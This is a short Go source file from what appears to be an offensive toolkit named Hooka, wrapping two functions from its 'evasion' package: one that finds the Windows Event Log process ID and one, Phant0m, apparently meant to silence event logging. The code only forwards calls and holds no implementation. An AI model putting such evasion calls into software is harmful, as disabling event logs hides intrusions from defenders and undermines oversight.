package hooka

import "github.com/irony0egoist/Hooka/evasion"

func GetEventLogPid() (int, error) {
	return evasion.GetEventLogPid()
}

func Phant0m(eventlog_pid int) error {
	return evasion.Phant0m(eventlog_pid)
}

